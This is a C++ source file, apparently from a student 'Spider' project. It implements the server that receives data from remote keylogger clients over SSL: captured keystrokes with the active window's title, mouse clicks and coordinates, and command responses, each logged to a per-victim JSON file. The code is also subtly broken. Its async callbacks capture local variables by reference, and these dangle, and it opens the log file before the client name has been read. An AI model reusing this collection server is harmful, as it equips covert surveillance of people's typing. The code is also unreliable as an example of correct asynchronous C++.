//
// Spider.cpp<travaux> for epitech in /home/chapui_s/rendu/
//
// Made by chapui_s
// Login   <chapui_s@epitech.eu>
//
// Started on  Wed Oct 21 09:18:47 2015 chapui_s
// Last update Tue Oct 27 17:24:05 2015 bresci_b bresci_b
//

#include "Spider.hh"
#include "Web.hh"

Spider::Spider(const boost::shared_ptr<ISocketEngine> &socket, Web &web)
  : _socket(socket),
    _web(web)
{
  DEBUG_MSG("Spider created");
  _json = new Json();
  _socket->handleError([this](){dieInDignity();});
}

Spider::~Spider()
{
  DEBUG_MSG("Spider deleted");
  if (_json)
    delete _json;
}

void		Spider::dieInDignity()
{
  _web.deleteSpider(shared_from_this());
}

void		Spider::prepareFirstConnection()
{
  _socket->doHandshake(boost::asio::ssl::stream_base::server, [this](){ doFirstConnection(); });
}

void			Spider::doFirstConnection()
{
  _socket->async_read(_buffer.data(), 4, [this]() {
      uint16_t		sizeName;

      _proto = _buffer.getValue<uint16_t>();
      sizeName = _buffer.getValue<uint16_t>();

      std::cout << _buffer << std::endl;

      _socket->async_read(_buffer.data(), sizeName, [this, sizeName]() {
      	  _buffer.getValue<char>(_str, sizeName);
	  _name = _str;
	  _buffer[0] = 1;
	  _socket->async_write(_buffer.data(), 1, [this](){ getTypeInfo(); });
      	});
    });
  if (_json)
    _json->openFile(_name);
}

void			Spider::getTypeInfo()
{
  uint8_t		id = 0;

  _buffer.reset();
  _socket->async_read(_buffer.data(), 1, [this, &id]() {
      id = _buffer.getValue<uint8_t>();
      switch (id)
      {
      case (Paquet::KEYSTROKES):
	_socket->async_read(_buffer.data(), 6, [this](){ getKeystrokes(); });
	break ;

      case (Paquet::MOUSE):
	_socket->async_read(_buffer.data(), 6, [this](){ getMouse(); });
	break ;

      case (Paquet::COMMAND_CLIENT):
	_socket->async_read(_buffer.data(), 3, [this](){ getClientCMD(); });
	break ;

      default:
	std::cerr << "Wrong data with spider " << _name << std::endl;
	dieInDignity();
	break ;
      }
    });
}

void			Spider::getKeystrokes()
{
  uint16_t		sizeActive = 0;
  uint16_t		sizeText = 0;
  PaquetKeys		paquet;

  _buffer.reset();
  paquet.setDate(_buffer.getValue<uint32_t>());
  sizeActive = _buffer.getValue<uint16_t>();
  _buffer.reset();
  _socket->async_read(_buffer.data(), sizeActive, [this, &paquet, &sizeActive, &sizeText]() {
      _buffer.getValue<char>(_str, sizeActive);
      paquet.setActive(_str);

      _buffer.reset();
      _socket->async_read(_buffer.data(), 2, [this, &paquet, &sizeActive, &sizeText]() {
	  sizeText = _buffer.getValue<uint16_t>();

	  _buffer.reset();
	  _socket->async_read(_buffer.data(), sizeText, [this, &paquet, &sizeText]() {
	      _buffer.getValue<char>(_str, sizeText);
	      paquet.setText(_str);
	      paquet.createPaquet();

#ifdef DEBUG
	      std::cerr << paquet << std::endl;
#endif // !DEBUG

	      if (_json)
		_json->writePaquetKeys(&paquet);

	      getTypeInfo();
	    });
	});
    });
}

void			Spider::getMouse()
{
  uint16_t		sizeActive = 0;
  PaquetMouse		paquet;

  _buffer.reset();
  paquet.setDate(_buffer.getValue<uint32_t>());
  sizeActive = _buffer.getValue<uint16_t>();
  _buffer.reset();
  _socket->async_read(_buffer.data(), sizeActive, [this, &paquet, &sizeActive]() {
      _buffer.getValue<char>(_str, sizeActive);
      paquet.setActive(_str);

      _buffer.reset();
      _socket->async_read(_buffer.data(), 5, [this, &paquet]() {
	  paquet.setX(_buffer.getValue<uint16_t>());
	  paquet.setY(_buffer.getValue<uint16_t>());
	  paquet.setButton(_buffer.getValue<uint8_t>());
	  paquet.createPaquet();

#ifdef DEBUG
	  std::cerr << paquet << std::endl;
#endif // !DEBUG

	  if (_json)
	    _json->writePaquetMouse(&paquet);

	  getTypeInfo();
	});
    });
}

void			Spider::getClientCMD()
{
  uint16_t		sizeData = 0;
  PaquetCommandClient	paquet;

  _buffer.reset();
  paquet.setOk(_buffer.getValue<uint8_t>());
  sizeData = _buffer.getValue<uint16_t>();
  _buffer.reset();
  _socket->async_read(_buffer.data(), sizeData, [this, &paquet, &sizeData]() {
      _buffer.getValue<char>(_str, sizeData);
      paquet.setDataReponse(_str);
      paquet.createPaquet();

#ifdef DEBUG
      std::cerr << paquet << std::endl;
#endif // !DEBUG

      // ICI

      getTypeInfo();
    });
}
